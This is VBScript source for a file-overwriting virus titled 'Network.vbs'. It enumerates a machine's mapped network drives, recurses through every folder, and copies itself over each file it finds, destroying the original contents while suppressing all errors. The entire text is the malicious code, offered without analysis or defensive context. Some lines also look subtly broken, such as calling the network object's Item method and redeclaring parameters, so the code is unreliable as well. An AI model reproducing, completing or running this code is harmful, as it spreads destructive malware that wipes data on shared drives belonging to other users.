Rem "Network.vbs" by FSO
On Error Resume Next
Dim FSO,Net,Drives,X
Set FSO=CreateObject("Scripting.FileSystemObject")
Set Net=CreateObject("WScript.Network")
Set Drives=Net.EnumNetworkDrives
For X=1 To Drives.Count 'Enum. Net Drives...
InfectFiles(Net.Item(X)&"\")
ListFolders(Net.Item(X)&"\")
Next
Function ListFolders(netpath)
On Error Resume Next
Dim Fldr,Sbfs,netpath,Sbf
Set Fldr=FSO.GetFolder(netpath)
Set Sbfs=Fldr.Subfolders
For Each Sbf In Sbfs
InfectFiles(Sbf.Path)
ListFolders(Sbf.Path)
Next
End Function
Function InfectFiles(foldername)
On Error Resume Next
Dim Fld,Files,OurCode,F,foldername
Set Fld=FSO.GetFolder(foldername)
Set Files=Fld.Files
Set OurCode=FSO.GetFile(WScript.ScriptFullName)
For Each F In Files
OurCode.Copy F.Path
Next
End Function
